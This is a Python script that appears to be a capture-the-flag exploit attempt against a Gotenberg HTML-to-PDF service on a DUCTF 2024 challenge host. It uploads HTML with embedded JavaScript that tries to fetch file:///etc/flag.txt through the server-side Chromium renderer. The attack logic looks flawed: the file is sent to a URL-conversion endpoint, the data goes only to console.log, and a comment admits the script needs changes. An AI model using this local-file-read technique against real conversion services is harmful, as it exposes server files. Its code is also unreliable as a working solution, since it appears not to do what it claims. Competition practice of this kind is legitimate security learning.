import requests

# URL of the Gotenberg server's HTML to PDF conversion endpoint
url = 'https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/url'

# Construct the HTML payload
# NOTE: This is a basic example; you'll need to modify it according to the specifics of the vulnerability
html_payload = """
<html>
<body>
<script>
fetch('file:///etc/flag.txt')
  .then(response => response.text())
  .then(data => console.log(data));
</script>
</body>
</html>
"""

# Prepare the files to be sent in the POST request
files = {'file': ('flag.html', html_payload)}

# Send the POST request
response = requests.post(url, files=files)

# Check the response
if response.status_code == 200:
    print("Payload sent successfully. Check the server's response.")
    # Optionally, print the response content or other details
    print(response.content)
else:
    print("Failed to send payload.")
    print("Status code:", response.status_code)
    print("Response body:", response.text)
